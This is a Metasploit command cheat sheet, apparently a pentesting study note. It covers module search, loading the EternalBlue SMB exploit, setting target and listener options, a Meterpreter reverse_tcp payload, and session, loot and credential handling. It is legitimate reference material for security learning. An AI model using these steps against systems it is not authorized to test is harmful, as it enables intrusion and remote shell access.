#tool #cheatsheet #metasploit #msfconsole #exploitation

# Metasploit Cheat Sheet

Metasploit is a modular exploitation framework used to perform vulnerability validation, exploitation, payload delivery, session management, and post-exploitation. It provides a unified interface for interacting with exploits, scanners, payloads, and compromised systems.

---

# Starting Metasploit

```bash
msfconsole
```

Start the Metasploit Framework.

---

# Searching Modules

```bash
search smb

search eternalblue

search cve:2017

search type:exploit smb

search platform:windows
```

Search for modules using keywords, CVEs, platforms, or module types.

---

# Selecting a Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Load the selected module.

---

# Module Information

```bash
info

show options

show payloads

show targets
```

Display documentation and configuration options.

---

# Configuring Options

```bash
set RHOSTS <target>

set RPORT 445

set LHOST <your-ip>

set LPORT 4444

unset RHOSTS

setg LHOST <your-ip>

unsetg LHOST
```

Configure module parameters.

---

# Running Modules

```bash
run

exploit

run -j

check
```

Execute or validate a module.

---

# Payload Management

```bash
set payload windows/x64/meterpreter/reverse_tcp

show payloads
```

Configure payloads for exploit modules.

---

# Session Management

```bash
sessions

sessions -i 1

sessions -k 1

background
```

List, interact with, terminate, or background sessions.

---

# Jobs

```bash
jobs

jobs -k <id>
```

Manage background jobs.

---

# Database

```bash
db_status

workspace

workspace -a lab

hosts

services

loot

creds

vulns
```

View information stored inside the Metasploit database.

---

# Resource Scripts

```bash
resource script.rc
```

Execute a resource script.

---

# Commands You'll Use Most

```bash
search <keyword>

use <module>

info

show options

set RHOSTS <target>

set LHOST <your-ip>

show payloads

run

sessions

background
```